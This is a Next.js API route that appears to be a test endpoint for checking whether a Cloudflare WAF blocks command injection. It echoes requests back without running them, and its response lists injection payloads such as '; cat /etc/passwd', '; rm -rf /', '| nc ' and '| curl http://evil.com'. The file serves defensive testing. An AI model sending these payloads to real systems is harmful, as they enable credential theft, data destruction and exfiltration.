import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { command, cmd, exec, system, input } = body;
    const payload = command || cmd || exec || system || input;

    console.log(`Command Injection test:`, { payload, ip: request.headers.get('x-forwarded-for') || 'unknown' });

    return NextResponse.json({
      success: true,
      message: "Command execution request processed",
      warning: "⚠️ Command injection payload was NOT blocked by WAF!",
      timestamp: new Date().toISOString(),
      payload: payload,
      requestInfo: {
        method: "POST",
        endpoint: "/api/test/command-injection"
      },
      expectedBehavior: "Cloudflare WAF should block requests containing command injection patterns",
      dangerousPatterns: [
        "; cat /etc/passwd", "| whoami", "&& ls -la",
        "`whoami`", "$(whoami)", "${IFS}",
        "; rm -rf /", "| nc ", "&& wget ",
        "powershell", "cmd.exe", "/bin/bash"
      ],
      cloudflareRules: [
        "OWASP CRS - OS Command Injection",
        "Cloudflare Managed Ruleset - Command Injection",
        "Shell metacharacter detection"
      ],
      testPayloads: [
        "; cat /etc/passwd",
        "| whoami",
        "&& ls -la",
        "`id`",
        "$(uname -a)",
        "; ping -c 4 google.com",
        "| curl http://evil.com"
      ]
    });

  } catch (error) {
    return NextResponse.json({
      success: false,
      error: "Request processing failed"
    }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  const searchParams = request.nextUrl.searchParams;
  const command = searchParams.get('cmd') || searchParams.get('command') || searchParams.get('exec');
  
  console.log(`Command Injection GET test:`, { command, ip: request.headers.get('x-forwarded-for') || 'unknown' });

  return NextResponse.json({
    success: true,
    message: "GET request with command injection processed",
    warning: "⚠️ Command injection in URL parameters was NOT blocked by WAF",
    command: command,
    timestamp: new Date().toISOString(),
    expectedBehavior: "Cloudflare WAF should block GET requests with command injection patterns"
  });
}